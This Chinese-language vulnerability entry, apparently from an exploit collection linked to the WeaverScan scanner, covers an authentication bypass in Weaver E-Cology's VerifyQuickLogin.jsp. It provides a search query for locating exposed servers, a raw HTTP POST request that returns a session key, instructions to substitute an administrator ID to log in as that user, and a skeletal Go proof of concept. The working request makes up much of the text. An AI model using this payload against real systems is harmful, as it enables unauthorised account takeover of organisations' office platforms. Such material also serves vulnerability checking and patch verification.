---
source: "TD0U/WeaverScan"
---

# 泛微E-Cology VerifyQuickLogin.jsp 任意用户登录漏洞

## 漏洞描述

泛微 E-Cology 的 `/login/VerifyQuickLogin.jsp` 接口存在身份验证绕过漏洞。攻击者无需任何凭证，仅需提交 `identifier`、`language`、`ipaddress` 三个参数，服务器即返回包含 `sessionkey` 的响应，利用该 sessionkey 可直接以任意用户身份登录系统。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```http
POST /login/VerifyQuickLogin.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

identifier=1&language=1&ipaddress=1.1.1.1
```

若响应状态码为 200 且内容包含 `sessionkey`，则漏洞存在。`identifier` 可替换为任意用户 ID（如管理员 ID），获取对应用户的 sessionkey 后即可直接登录其账号。

参考 PoC（Go，来源 TD0U/WeaverScan）：

```go
func VerifyQuickLogin(target string) {
    url := target + "/login/VerifyQuickLogin.jsp"
    payload := "identifier=1&language=1&ipaddress=1.1.1.1"
    // POST 请求，响应包含 "sessionkey" 即存在漏洞
}
```
